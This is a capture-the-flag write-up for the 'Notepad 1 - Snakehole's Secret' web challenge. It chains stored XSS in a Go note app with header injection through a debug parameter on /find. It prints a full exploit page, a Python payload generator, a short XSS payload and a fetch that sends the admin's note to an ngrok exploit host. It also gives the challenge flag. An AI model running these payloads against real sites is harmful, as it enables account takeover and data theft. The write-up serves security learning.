---
description: Stored XSS and Response Header Injection Leads to CSRF
---

# Notepad 1 - Snakehole's Secret

## Challenge

**Description:** Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.

**Author:** [Az3z3l](https://twitter.com/Az3z3l)

## Solution

### Stored XSS

At first glance, it is very clear that the site was vulnerable to XSS. For instance, adding the note `<h1>Test</h1>` results in the heading tags being injected:

![](<../../.gitbook/assets/Screenshot 2021-08-16 at 9.07.57 PM.png>)

When the page is first loaded, the `init()` function is called, and the displayed note's innerHTML is changed to the `/get` response.

Notes are added through a POST request to `/add`.

```javascript
async function addNote() {
    x=document.getElementById("note-dev").value.trim()
    const response = await fetch("/add", {
        method: 'POST', 
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `content=${x}`
    });
    z = await (response.text());
    changeNote(x)
}

function changeNote(play){
    let ele = document.getElementById('my-stuff');
    ele.innerHTML = play+"<br />";
    document.getElementById("note-dev").value = ""
}

async function init(){
    const response = await fetch("/get", {
        method: 'GET', 
    });
    z = await (response.text());
    changeNote(z)
}
```

The `/get` endpoint retrieves notes from the `Notes` map, based on the user's ID cookie.

```go
func get(w http.ResponseWriter, r *http.Request) {
	id := getIDFromCooke(r, w)
	x := Notes[id]
	headerSetter(w, cType)
	if x == "" {
		fmt.Fprintf(w, "404 No Note Found")
	} else {
		fmt.Fprintf(w, x)
	}
}
```

The `/add` endpoint stores the user's notes, but only if the notes' content is less than 75 characters. In order to create a valid stored XSS payload, we must use a relatively short one.

```go
func add(w http.ResponseWriter, r *http.Request) {

	id := getIDFromCooke(r, w)
	if id != adminID {
		r.ParseForm()
		noteConte := r.Form.Get("content")
		if len(noteConte) < 75 {
			Notes[id] = noteConte
		}
	}
	fmt.Fprintf(w, "OK")
}
```

Note that for all the API endpoints, the following cookies are set to prevent XSS.

```go
// Prevent XSS on api-endpoints ¬‿¬
var cType = map[string]string{
	"Content-Type":            "text/plain",
	"x-content-type-options":  "nosniff",
	"X-Frame-Options":         "DENY",
	"Content-Security-Policy": "default-src 'none';",
}
```

Since the notes are fetched based on the user's cookies, we still do not have a way to perform an XSS attack on the admin (we would only be able to do it to ourselves!). 

### Response Header Injection

There is one other API endpoint, though, that we haven't explored. The `/find` endpoint takes the `condition`, `startsWith` , `endsWith` and `debug` parameters. The first three are pretty simple - they help to check if the note starts with or ends with a certain substring.

The `debug` parameter, on the other hand, is quite interesting. If it is set, the 4 parameters above are deleted, and the remaining parameters are looped through. If the key matches the `^[a-zA-Z0-9{}_;-]*$` regex, and the value is less than 50 characters, then the key-value pair is set as a response header.

```go
func find(w http.ResponseWriter, r *http.Request) {

	id := getIDFromCooke(r, w)

	param := r.URL.Query()
	x := Notes[id]

	var which string
	str, err := param["condition"]
	if !err {
		which = "any"
	} else {
		which = str[0]
	}

	var start bool
	str, err = param["startsWith"]
	if !err {
		start = strings.HasPrefix(x, "snake")
	} else {
		start = strings.HasPrefix(x, str[0])
	}
	var responseee string
	var end bool
	str, err = param["endsWith"]
	if !err {
		end = strings.HasSuffix(x, "hole")
	} else {
		end = strings.HasSuffix(x, str[0])
	}

	if which == "starts" && start {
		responseee = x
	} else if which == "ends" && end {
		responseee = x
	} else if which == "both" && (start && end) {
		responseee = x
	} else if which == "any" && (start || end) {
		responseee = x
	} else {
		_, present := param["debug"]
		if present {
			delete(param, "debug")
			delete(param, "startsWith")
			delete(param, "endsWith")
			delete(param, "condition")

			for k, v := range param {
				for _, d := range v {

					if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) < 50 {
						w.Header().Set(k, d)
					}
					break
				}
				break
			}
		}
		responseee = "404 No Note Found"
	}
	headerSetter(w, cType)
	fmt.Fprintf(w, responseee)
}
```

Remember how we couldn't get the admin to visit our note previously? Well, now we can! All we have to do is to inject a `Set-Cookie` header, setting the admin's ID cookie to our own.

But we still need the original admin's ID (otherwise, how do we get the admin's note?). We can get around that quite easily, though - by simply setting the `Path` of our custom cookie to `/get`, we can make sure that when the admin visits our main site, our custom `id` cookie is used (since the longest match "wins"). However, since the admin's original `id` cookie still exists with the `Path` set to `/`, the `/find` endpoint will still use the original admin ID.

### Crafting Our Payload

_On hindsight, this was way more complex than necessary. The intended solution simply used `eval(window.name)`, since `window.name` can be set by the attacker when using `window.open()`. I'll share mine anyway, because it was quite interesting (to me at least)._

Since we’re in innerHTML, the ideal way is to append a new script element and fetch our external script:

`var newScript = document.createElement("script");newScript.src = "http://www.example.com/my-script.js";this.appendChild(newScript);`

But there’s a 75 character limit in order for the XSS payload to be stored. 

I ended up using cookies, since `document.cookies` will return a string like:

```
cookieA=valueA; cookieB=valueB; ...
```

This format is very convenient to create JS code which we can `eval()`. Let the cookie name be `var x`, and the cookie value be `eval(alert())`, and we can run valid JavaScript code using `eval(document.cookie)`:

```javascript
var x = eval(alert())
```

Since the header values _also_ have a length limit of 50 characters, we need to set multiple cookies. Essentially, the `document.cookies` will return the following string (newlines inserted for clarity):

```javascript
var A = "SOME_STRING";
var B = A + "SOME_STRING";

...

var a = Z + "SOME_STRING";
var b = eval(a)
```

Here's the script to convert the payload to the necessary URLs to set the cookies:

```python
import urllib.parse
import string

PAYLOAD = "var newScript = document.createElement('script');newScript.src = 'http://2e2e80a5f153.ngrok.io/exploit.js';this.appendChild(newScript);"

charcodes = []
for char in PAYLOAD:
	charcodes.append(ord(char))
	
print(charcodes)

f = open("exploit.html", "w")

chars = string.ascii_uppercase + string.ascii_lowercase
i = 0

f.write("<script>\n")
while charcodes:
	codes = [str(x) for x in charcodes[:5]]
	charcodes = charcodes[5:]
	
	if i == 0:
		url = urllib.parse.quote(f"var {chars[i]}=String.fromCharCode({','.join(codes)});")
		
	else:
		url = urllib.parse.quote(f"var {chars[i]}={chars[i-1]}+String.fromCharCode({','.join(codes)});")
	i += 1
	
	url = "http://chall.notepad1.gq:1111/find?debug&Set-Cookie=" + url

	f.write(f"window.open(\"{url}\");\n")

url = urllib.parse.quote(f"var {chars[i]}=eval({chars[i-1]});")
url = "http://chall.notepad1.gq:1111/find?debug&Set-Cookie=" + url
f.write(f"window.open(\"{url}\");\n")

f.write("</script>")
```

With some modification of the output, the final exploit script is:

```markup
<script>

function wait(time) {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve();
        }, time);
    });
}

(async () => {
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20A%3DString.fromCharCode%28118%2C97%2C114%2C32%2C110%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20B%3DA%2BString.fromCharCode%28101%2C119%2C83%2C99%2C114%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20C%3DB%2BString.fromCharCode%28105%2C112%2C116%2C32%2C61%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20D%3DC%2BString.fromCharCode%2832%2C100%2C111%2C99%2C117%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20E%3DD%2BString.fromCharCode%28109%2C101%2C110%2C116%2C46%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20F%3DE%2BString.fromCharCode%2899%2C114%2C101%2C97%2C116%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20G%3DF%2BString.fromCharCode%28101%2C69%2C108%2C101%2C109%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20H%3DG%2BString.fromCharCode%28101%2C110%2C116%2C40%2C39%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20I%3DH%2BString.fromCharCode%28115%2C99%2C114%2C105%2C112%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20J%3DI%2BString.fromCharCode%28116%2C39%2C41%2C59%2C110%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20K%3DJ%2BString.fromCharCode%28101%2C119%2C83%2C99%2C114%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20L%3DK%2BString.fromCharCode%28105%2C112%2C116%2C46%2C115%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20M%3DL%2BString.fromCharCode%28114%2C99%2C32%2C61%2C32%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20N%3DM%2BString.fromCharCode%2839%2C104%2C116%2C116%2C112%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20O%3DN%2BString.fromCharCode%2858%2C47%2C47%2C50%2C101%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20P%3DO%2BString.fromCharCode%2850%2C101%2C56%2C48%2C97%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20Q%3DP%2BString.fromCharCode%2853%2C102%2C49%2C53%2C51%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20R%3DQ%2BString.fromCharCode%2846%2C110%2C103%2C114%2C111%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20S%3DR%2BString.fromCharCode%28107%2C46%2C105%2C111%2C47%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20T%3DS%2BString.fromCharCode%28101%2C120%2C112%2C108%2C111%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20U%3DT%2BString.fromCharCode%28105%2C116%2C46%2C106%2C115%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20V%3DU%2BString.fromCharCode%2839%2C59%2C116%2C104%2C105%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20W%3DV%2BString.fromCharCode%28115%2C46%2C97%2C112%2C112%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20X%3DW%2BString.fromCharCode%28101%2C110%2C100%2C67%2C104%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20Y%3DX%2BString.fromCharCode%28105%2C108%2C100%2C40%2C110%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20Z%3DY%2BString.fromCharCode%28101%2C119%2C83%2C99%2C114%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20a%3DZ%2BString.fromCharCode%28105%2C112%2C116%2C41%2C59%29%3B");
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=var%20b%3Deval%28a%29%3B");
	
	await wait(1000);
	window.open("http://chall.notepad1.gq:1111/find?debug&Set-Cookie=id=5e732a1878be2342dbfeff5fe3ca5aa3%3B+Path=/get");
	
	var img = new Image();
	img.src = 'http://2e2e80a5f153.ngrok.io/?data=' + 'Set cookies successfully.';
	
	await wait(1000);
	window.location.href = "http://chall.notepad1.gq:1111/";
})();
</script>
```

Visiting these URLs set the following cookies. Notice that we have set the `id` cookie with the `/get` path, and that the original `id` with the `/` path is preserved.

![](<../../.gitbook/assets/image (45).png>)

After `document.cookie.split('; ').sort()`, the previously inserted cookies will be in the correct order, starting from `var A`, and each subsequent variable builds on top of the previous variable.

![](<../../.gitbook/assets/image (46).png>)

`var a` will end up being the full payload:

![](<../../.gitbook/assets/image (47).png>)

This is finally eval-ed again (inside the eval) by `var b`.

The XSS payload is then:

```markup
<img/src/onerror="eval(document.cookie.split('; ').sort().join(';'))">
```

This takes up 70 characters, satisfying the length requirement in order to be stored.

![](<../../.gitbook/assets/image (48).png>)

Now, we can store this XSS payload! When the admin visits the site, our payload is fetched:

![](<../../.gitbook/assets/image (49).png>)

The only thing left now is to perform a CSRF to the `/find` endpoint to get the flag, and make a callback to our exploit server with the data.

```javascript
fetch('find?startsWith=in')
	.then(function(response) {return response.text();})
	.then(function (text) {
	var img = new Image();
	img.src = 'http://2e2e80a5f153.ngrok.io/?data=' + encodeURIComponent(text);
})
```

### Pwned

This took way too long, because I didn't think of the simple `window.name` payload! 

![](<../../.gitbook/assets/image (50).png>)

Regardless, I was excited to finally the flag, after way more pain than necessary.

`inctf{youll_never_take_me_alive_ialmvwoawpwe}`
